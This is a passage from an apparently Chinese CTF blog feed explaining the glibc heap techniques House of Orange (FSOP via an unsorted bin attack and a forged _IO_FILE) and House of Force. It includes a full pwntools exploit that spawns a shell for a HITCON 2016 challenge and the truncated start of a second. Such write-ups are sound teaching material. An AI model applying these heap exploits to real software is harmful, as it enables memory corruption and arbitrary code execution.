id="fsop">FSOP</span></h2><p>和 rop 很像，也是一种劫持程序流程的方式，只是攻击 File Stream来实现罢了。</p><h3><span id="unsortbin-attack-劫持">unsortbin attack 劫持</span></h3><p><code>Unsorted bin chunk</code>摘除代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>只看最后两行就行，<code>unsorted_chunk</code> 的<code>bk</code>指针指向的是它后一个被释放的 chunk 的块地址（bck），后一个被释放的chunk 的<code>fd</code>指针指向的是<code>unsorted_chunk</code>的块地址，如果我们能够控制<code>unsorted_chunk</code>的<code>bk</code>，那么就意味着可以将<code>unsorted_chunks (av)</code>，即<code>unsorted_chunk</code>的块地址写到任意可写地址内。</p><p>攻击之前布局</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-orange/1636028792269345/676223590900290aa3617ef9de4ad25352001180.png" alt="image-20211104202631960"></p><p>我们将<code>_IO_list_all-0x10</code>伪造成<code>bk</code>，那么此时<code>bck-&gt;fd = _IO_list_all = unsorted_chunks (av) = main_arena + 88</code></p><p>此时的  main_arena+88 相当于一个  IO_file_plus 结构，但是这里面的内容我们是不能完全控制的，但是 IO_file_plus 结构中还有个 _chain 指针，它位于 IO_file_plus+0x68 处，指向了下一个 IO_file_plus 结构体，像单链表一样串起来的。那么 _chain 在这就相当于 main_arena+88 + 0x68 = main_arena + 0xC0 处，而 main_arena + 0xC0 存储着的是 small bin 的头地址。所以，我们要让 main_arena + 0xC0 指向一个我们可控的地方，然后在那里伪造第二个 IO_file_plus 结构，即通过转移，让它转移到我们可控的地方。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-orange/1636030154919522/bef45e53bde9a01d902c73a455c4a7a2eeb59b27.png" alt="image-20211104204914735"></p><p>我们可以把 unsorted bin 的头结点的 size 改成 0x60 ，这样当我们调用 malloc ，glibc 会整理 unsorted bin ，把其放入 small bin 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *  </span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="comment">/* remove from unsorted list */</span>  </span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;  </span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span>  </span><br><span class="line">  </span><br><span class="line">          <span class="keyword">if</span> (size == nb)  </span><br><span class="line">            &#123;  </span><br><span class="line">              set_inuse_bit_at_offset (victim, size);  </span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)  </span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;  </span><br><span class="line">              check_malloced_chunk (av, victim, nb);  </span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);  </span><br><span class="line">              alloc_perturb (p, bytes);  </span><br><span class="line">              <span class="keyword">return</span> p;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">/* place chunk in bin */</span>  </span><br><span class="line">  </span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))  </span><br><span class="line">            &#123;  </span><br><span class="line">              victim_index = smallbin_index (size);  <span class="comment">//victim_index=6</span></span><br><span class="line">              bck = bin_at (av, victim_index);  <span class="comment">//bck=&amp;av-&gt;bins[10]-0x10</span></span><br><span class="line">              fwd = bck-&gt;fd;  <span class="comment">//fwd=&amp;av-&gt;bins[10]</span></span><br><span class="line">            &#125;  </span><br><span class="line">...  </span><br><span class="line">mark_bin (av, victim_index);  </span><br><span class="line">victim-&gt;bk = bck;  </span><br><span class="line">victim-&gt;fd = fwd;  </span><br><span class="line">fwd-&gt;bk = victim;<span class="comment">//&amp;av-&gt;bins[10]+0x18 = old_top  </span></span><br><span class="line">bck-&gt;fd = victim; </span><br><span class="line"> </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>main_arena 结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  <span class="comment">/* Serialize access.  */</span>  </span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span>  </span><br><span class="line">  <span class="keyword">int</span> flags;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Fastbins */</span>  </span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span>  </span><br><span class="line">  mchunkptr top;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span>  </span><br><span class="line">  mchunkptr last_remainder;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span>  </span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span>  </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Linked list */</span>  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized </span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span>  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on </span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by </span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span>  </span><br><span class="line">  INTERNAL_SIZE_T attached_threads;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span>  </span><br><span class="line">  INTERNAL_SIZE_T system_mem;  </span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;  </span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure><p>av-&gt;bins[10]+0x18 = main_arena + 0x58 + 0x8*10 + 0x18 = main_arena + 0xC0 = old_top</p><p>我们让unsorted bin的size为0x60，是为了让chain指针正好重新指回来，指向我们可控的地方。</p><h3><span id="malloc-函数报错处理">malloc 函数报错处理</span></h3><p>先要了解 <code>malloc</code> 函数报错时的处理，<code>malloc_printerr</code>是<code>malloc</code>中用来打印错误的函数。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-orange/1635948632210341/fcebe0fcfe89eab79ecd203ccc435bc1d3be2247.png" alt="1"></p><p><code>malloc_printerr</code>函数其实是调用<code>__libc_message</code>函数之后又调用<code>abort</code>函数，<code>abort</code>函数其中调用了<code>_IO_flush_all_lockp</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">…</span><br><span class="line">    fp = fp-&gt;_chain;</span><br><span class="line">    ...</span><br><span class="line">          <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<span class="comment">/*我们需要构造满足条件*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<span class="comment">/*从_IO_list_all指向的FILE结构开始查找，找到合适_IO_FILE作为_IO_OVERFLOW的参数，执行vtable里面的函数，把IO_FILE结构体本身作为参数*/</span>  </span><br></pre></td></tr></table></figure><p>如果满足以下条件：</p><ol><li><p>fp-&gt;<em>mode &gt; 0</em></p></li><li><p>_IO_vtable_offset (fp) == 0</p></li><li><p>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</p><p>就会调用  _IO_OVERFLOW ，并把结构体当做第一个参数传入<br>如果我们能够把  _IO_OVERFLOW 改为 system ，并且伪造结构体，开头为 /bin/sh ，就能获得 shell 了</p></li></ol><hr><p>简言之</p><ol><li>利用堆溢出将 top chunk size 改小,使其进入 unsorted bin 泄露地址</li><li>在 unsorted bin 伪造使 size 变为 0x60 ，并伪造出一个 io_file 结构</li></ol><h2><span id="例题">例题</span></h2><p>buu  houseoforange_hitcon_2016</p><p>这题可以说是 house of orange 里的代表了，可以说上面每个手法都利用到了</p><p>程序没有 free 函数，有堆溢出并能改到 top chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">sh = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&#x27;node4.buuoj.cn&#x27;,29741)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;2.23/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">size,name</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Length of name :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Name :&#x27;</span>,name)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Price of Orange:&#x27;</span>,<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Color of Orange:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">size,name</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Length of name :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Name:&#x27;</span>,name)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Price of Orange:&#x27;</span>,<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Color of Orange:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">build(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line"><span class="comment">#修改top chunk的size为0xF80</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xF80</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#申请一个比top chunk的size大的空间，那么top chunk会被放入unsorted bin</span></span><br><span class="line">build(<span class="number">0x1000</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">build(<span class="number">0x400</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line"><span class="comment">#接下来申请unsorted bin里的chunk，泄露libc地址和堆地址</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Name of house : &#x27;</span>)</span><br><span class="line">leak = u64(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">io_list_all = (leak &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + (libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>] &amp; <span class="number">0xFFF</span>)</span><br><span class="line">libcbase = io_list_all - libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#这边算出的 io_list_all 地址是错的</span></span><br><span class="line"><span class="string">sh.recvuntil(&#x27;Name of house : &#x27;)</span></span><br><span class="line"><span class="string">leak = u64(sh.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="string">print &quot;leak: &quot; + hex(leak)</span></span><br><span class="line"><span class="string">libcbase = leak -4451</span></span><br><span class="line"><span class="string">print &quot;libcbase: &quot; + hex(libcbase)</span></span><br><span class="line"><span class="string">io_list_all = libcbase + libc.sym[&#x27;_IO_list_all&#x27;]</span></span><br><span class="line"><span class="string">system = libc.symbols[&#x27;system&#x27;] + libcbase</span></span><br><span class="line"><span class="string">print &quot;io_list_all: &quot; + hex(io_list_all)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">edit(<span class="number">0x10</span>, payload)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap = u64(sh.recvuntil(<span class="string">&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap: &quot;</span> + <span class="built_in">hex</span>(heap)</span><br><span class="line">heap_base = heap - <span class="number">0xE0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base: &quot;</span> + <span class="built_in">hex</span>(heap_base)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">-----------------------------------------------------------------------------------------------------</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line"><span class="comment">#可以说是一个模板了</span></span><br><span class="line"><span class="comment">#执行vtable的函数时，FILE结构体地址被作为参数，因此，我们在最开头写/bin/sh字符串</span></span><br><span class="line">fake_file = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x60</span>) <span class="comment">#size作为0x60，被放入small_bin，从而对应了chain指针</span></span><br><span class="line"><span class="comment">#unsorted bin attack，修改_IO_list_all为main_arena+88</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(io_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xC0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">fake_file += p64(heap_base + <span class="number">0x5E8</span>)<span class="comment">#vtable ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_file += p64(system) <span class="comment">#__overflow</span></span><br><span class="line">payload += fake_file</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>说一下被注释的地方为啥是错的，因为我们泄露出来的地址是处在 libc 的 data 段</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-orange/1636081342722980/0278602ef7af7a0bf3e3a3511c415db5139d8e29.png" alt="image-20211105110222421"></p><p>而我们需要的是代码段的基地址，可以看到算出来的 _IO_list_all 地址也是错的</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-orange/1636082226040989/94ed1174b442b72efad937301d15ea8fc26e64f5.png" alt="image-20211105111705852"></p><p>咋整捏，可以直接在 gdb 中找我们需要的函数地址，会发现我们泄露出来的地址和 _IO_list_all 很接近</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-orange/1636082503422977/6ee291b744e13aa10e613abc624b31f40be03b3a.png" alt="image-20211105112143172"></p><p>地址后三位是不会变的，于是想到直接凑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io_list_all = (leak &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + (libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>] &amp; <span class="number">0xFFF</span>)</span><br></pre></td></tr></table></figure><p>然后就可以算出 libcbase 了</p><hr><p>参考博客</p><p><a href="https://blog.csdn.net/weixin_44145820/article/details/105270036">https://blog.csdn.net/weixin_44145820/article/details/105270036</a></p><p><a href="https://bbs.pediy.com/thread-222718.htm">https://bbs.pediy.com/thread-222718.htm</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/104314949">https://blog.csdn.net/seaaseesa/article/details/104314949</a></p><p><a href="https://www.cnblogs.com/L0g4n-blog/p/14217309.html">https://www.cnblogs.com/L0g4n-blog/p/14217309.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用之house of force</title>
      <link href="/2021/11/01/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse-of-force/"/>
      <url>/2021/11/01/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse-of-force/</url>
      
        <content type="html"><![CDATA[<p>house of force 是一种堆的利用手法，可以实现内存地址的读写。</p><h2><span id="top-chunk-的分割机制">top chunk 的分割机制</span></h2><p>top chunk 是堆内存管理器的后备空间，当各 bin 中没有 chunk 可以提供时，top chunk 会分割出一个 chunk 给用户，下面给出分割过程的源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = chunksize(victim);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE)) </span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>首先是 libc 会检查用户申请的大小，top chunk 给不给得起；</li><li>如果给得起，就在 top chunk 的 head 处，<strong>以用户申请大小所匹配的 chunk 大小为偏移量，将 top chunk 的位置推到新的位置</strong>，而原来的 top chunk head 处就作为新的堆块被分配给用户了；</li></ol><p>如果我们能控制 top chunk 在这个过程中偏移到任意位置，也就是说，如果我们能控制用户申请的大小为任意值，我们就能将 top chunk 劫持到任意内存地址，然后就可以控制目标内存。</p><hr><p><strong>简言之</strong></p><ol><li>溢出已经分配的 chunk，覆盖到 top chunk 的 size 位；</li><li>算出 top chunk 与目标地址的距离，将 top chunk 位置推到目标地址</li></ol><h2><span id="溢出-top-chunk">溢出 top chunk</span></h2><p>当我们 malloc 一个堆块，此堆块的下一个就是 top chunk 时，当我们输入的数据大小能够超过申请的大小，就能堆溢出到 top chunk，当我们将 top chunk 的 size 字段改得非常大时就可以通过检查了，一般我们会传入 -1 ，因为 ptmalloc 的源码中对于 size 使用 unsigned long 进行强转抓换，负数用补码表示，将 -1 当成无符号数为 0xffffffffffffffff ，已经非常大了，用于绕过 if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) 验证。</p><h2><span id="例题">例题</span></h2><p>buu 上的 bcloud_bctf_2016</p><p>程序开的保护如下</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-force/1635751369496160/0bc4ec261d145b38518a3d6da6e1f2f8604df736.png"></p><p>本题最大的漏洞就在这两个函数中</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-force/1635754889755826/752b846ae81dff98b7c487e33f8e70cdb0a50d25.png" alt="image-20211101162129641"></p><h3><span id="func1">func1</span></h3><p>s 处输入 0x40 个字符能够覆盖到指针 v2 ，之后的堆地址又赋给了 v2 ，意味着 v2 处 s 的 0截断字符 被覆盖成了堆指针，从而在 strcpy 处可以泄露处可以泄露出堆地址</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-force/1635755409091509/ec1d1c267e74848e198785e209c21a650c95c04d.png" alt="image-20211101163008961"></p><h3><span id="func2">func2</span></h3><p>也是同理，并且因为 v3 和 s 只相差 4 个字符的缘故，可以修改到 top chunk 的 size 位</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-force/1635755367270204/f1f8b1e48ac0581bc5e7f13e4eca57ba2b1cdad2.png" alt="image-20211101162927102"></p><p>由于程序没有开 pie ，因此地址之间的偏移可以直接算出来，达到了 house of force 的条件，计算出 top chunk 和 chunk_addr (heap array) 的地址，就可以将 top chunk 指针 指向 heap array 从而控制整个堆指针数组，实现任意地址的读写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./main&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;27866&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;2.23/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span 